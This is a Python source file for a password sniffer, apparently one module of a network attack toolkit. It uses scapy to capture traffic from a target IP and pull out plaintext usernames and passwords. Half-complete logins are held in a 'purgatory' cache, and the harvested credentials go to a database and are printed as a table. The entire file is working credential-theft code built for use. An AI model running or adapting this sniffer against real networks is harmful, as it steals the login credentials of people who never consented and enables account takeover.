from config import pptable
from collections import namedtuple
from sniffer import Sniffer
from password_parser import parse_pkt
from scapy.all import *


class password_sniffer(Sniffer):
    """ Sniff and parse passwords from various protocols """
    def __init__(self):
        self.passwords = {}    # $host -> [(user, pass, service)]
        self.purgatory = {}  # $host -> {$dport:[user, pass, service]}
        super(password_sniffer, self).__init__('Password Sniffer')

    def initialize(self):
        """ initialize sniffer """
        self.get_ip()
        tmp = raw_input('[!] Sniff passwords from %s.  Is this correct? '
                                                                % self.source)
        if 'n' in tmp.lower():
            return None

        self.sniff_filter = "src %s" % self.source
        self.run()
        return self.source

    def dump(self, pkt):
        """Packet callback"""
        if not pkt is None:
            (usr, pswd) = parse_pkt(pkt)
            if not usr is None and not self.is_discovered(usr, pswd, pkt):
                self.log_msg('Host: %s\n[!] User: %s' % (pkt[IP].dst, usr))
            if not pswd is None and not self.is_discovered(usr, pswd, pkt):
                self.log_msg('Password: %s' % pswd)

            if usr is not None and pswd is not None:
                self.add_account_pw((usr, pswd, '%s:%s'
                                    % (pkt[IP].dst, pkt[TCP].dport)), pkt)
            elif not usr is None or not pswd is None:
                self.add_account(usr, pswd, pkt)

    def is_discovered(self, usr, pswd, pkt):
        """ check if the username/password has already been printed
        """
        if pkt[IP].dst in self.passwords.keys():
            if usr in [x[0] for x in self.passwords[pkt[IP].dst]] and  \
                    pswd in [x[1] for x in self.passwords[pkt[IP].dst]]:
                return True
        return False

    def add_account(self, username, password, pkt):
        """ Add the username/password to the local cache.  Because
            of the way that we process packets, we use a 'purgatory' cache
            that keeps track of usernames and destination hosts temporarily.
            Once we see the password entry, we update the cache and insert
            the entry into the table.

            For example, using FTP:
                User packet comes through: ('admin', None, destination:port)
                is added to temp cache.

                User packet comes through: (None, 'passw0rd', destination:port)
                is generated and, because we have a purgatory entry with a None
                password entry and a matching destination:port, we update it,
                remove it from the temp cache, and insert it into the real table.

            This allows us to store multiple half-complete entries for the same
            protocol on a different host.  If we attempt to insert a half-complete
            entry into temp cache where one exists for destination:port, we'll
            log that entry anyways (i.e. username came twice before password) as
            it could contain important information, such as the user entering their
            password in as username, or different account names on other systems.
        """
        host = pkt[IP].dst
        entry = [username, password, '%s:%s' % (pkt[IP].dst, pkt[TCP].dport)]
        # is this destination in purgatory?
        if host in self.purgatory.keys():
            # it is, are we kicking one out?
            if pkt[TCP].dport in self.purgatory[host].keys():
                # there's an entry here, check if the password is none
                if self.purgatory[host][pkt[TCP].dport][1] is None:
                    # update with password, log, and delete
                    self.purgatory[host][pkt[TCP].dport][1] = entry[1]
                    self.add_account_pw(tuple(self.purgatory[host][pkt[TCP].dport]), pkt)
                    del(self.purgatory[host][pkt[TCP].dport])
                else:
                    # its not, log this attempt and start over
                    self.add_account_pw(tuple(self.purgatory[host][pkt[TCP].dport]), pkt)
                    self.purgatory[host][pkt[TCP].dport] = entry
            else:
                # nope, new entry
                self.purgatory[host][pkt[TCP].dport] = entry
        else:
            # it isn't, create the entry
            self.purgatory[host] = {pkt[TCP].dport: entry}

    def add_account_pw(self, entry, pkt):
        """ Takes an entry from purgatory and sticks it into
            the actual password cache if it doesn't exist.
            @param entry is a tuple of (username,password,destination:port)
            @pkt is the received packet
        """
        host = pkt[IP].dst
        if host in self.passwords.keys():
            if not entry in self.passwords[host]:
                self.passwords[host].append(entry)
        else:
            self.passwords[host] = [entry]

        # update database
        self._dbcredentials(entry[0], entry[1],
                            entry[2].split(':')[0], self.source)

    def view(self):
        """ Iterate through all usernames/passwords
        """
        table = []
        Row = namedtuple('Row', ['Username', 'Password', 'Destination'])
        for key in self.passwords.keys():
            for account in self.passwords[key]:
                table.append(Row(account[0], account[1], account[2]))
        pptable(table)

        super(password_sniffer, self).view()
